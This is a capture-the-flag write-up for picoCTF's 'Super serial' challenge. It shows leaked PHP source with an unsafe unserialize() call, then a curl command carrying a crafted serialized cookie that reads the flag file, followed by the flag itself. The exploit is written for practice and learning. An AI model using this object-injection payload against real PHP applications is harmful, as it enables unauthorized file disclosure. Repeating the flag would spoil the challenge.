# Super serial

Try to recover the flag stored on this website http://mercury.picoctf.net:2148/

## Solution

At first glance, we see a login form. Nothing weird going on in the HTML. However, we do have a PHPSESSID present in the cookies.

Visiting /robots.txt reveals `Disallow: /admin.phps`. Interesting, a `.phps`-file. `http://mercury.picoctf.net:2148/admin.phps` cannot be found, but `http://mercury.picoctf.net:2148/index.phps` reveals the source code of `index.php`.

```
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```

As we can see from the source code, `cookie.php` and `authentication.php` exists. Nothing special on the corresponding pages, but let's try the `.phps` versions.

Further inspection of `authentication.phps` and `cookie.phps` reveals the following code:

(from `cookie.phps`)
```
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```

(from `authentication.phps`)
```
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
```

The fact that the code is utilizing the function `unserialize` in `cookie.phps` is veeery dangerous, and I guess this is going to be the attack vector. If we set the cookie ```login``` to a base64 encoded serialized ```access_log``` class, the ```$g = $perm->is_guest();``` row will throw an error because no such function exists. The ```$perm``` object will get printed out due to the following code:

from `cookie.phps`:
```
catch(Error $e){
	die("Deserialization error. ".$perm);
}
```

from `authentication.phps`:
```
function __toString() {
    return $this->read_log();
}

function read_log() {
    return file_get_contents($this->log_file);
}
```

### Constructing the serialized object

The question now is, how to construct the serialized object, and what should ```$log_file``` be? At this point, I was pretty stuck, so I looked at one of the hints which revealed that ```The flag is at ../flag```, great!

I created my base64 encoded serialized object using ```serialize.php```. Now, all we need to do is:

```
$  curl --cookie "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9" http://
mercury.picoctf.net:2148/authentication.php

Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c}
```

which reveals the flag °˖✧◝(⁰▿⁰)◜✧˖°

### General remarks

This one was fun. I've seen ```unserialize```-vulns before, It's nice to come across them again + be able to exploit them.




